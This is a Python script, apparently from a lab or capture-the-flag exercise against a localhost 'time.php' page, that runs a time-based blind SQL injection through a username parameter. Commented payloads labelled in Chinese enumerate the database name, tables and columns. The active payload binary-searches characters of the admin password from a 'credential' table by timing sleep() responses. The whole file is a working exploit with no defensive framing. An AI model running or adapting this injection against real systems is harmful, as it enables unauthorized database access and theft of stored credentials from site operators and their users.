import requests

url = 'http://localhost/time.php'
payload = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.{}'
passwd = ""

for i in range(1,80):
    low = 0
    high = 127

    while True:
        j = int((low + high)/2)
        # 爆库名：sqlstr = u"alice' and if(ascii(substr(database(), {}, 1))>{}, sleep(1), 1)#"
        # 爆表名：sqlstr = u"alice' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1))>{}, sleep(1), 0)#"
        # 爆字段名：sqlstr = u"alice' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='credential'), {}, 1))>{}, sleep(1), 0)#"
        # 爆数据：
        sqlstr = u"alice' and if(ascii(substr((select group_concat(Password) from credential where Name='admin'), {}, 1))>{}, sleep(1), 0)#"
        params = {"username": sqlstr.format(i, j), "Password": ""}

        ans = requests.get(url, params=params)
        try:     #true
            ans = requests.get(url, params=params, timeout=1)
            if high == low+1:
                passwd += chr(low)
                print(passwd)
                break
            high = j

        except:       #false
            if high == low+1:
                passwd += chr(high)
                print(passwd)
                break
            low = j


print(passwd)
print("error!length is too short!")
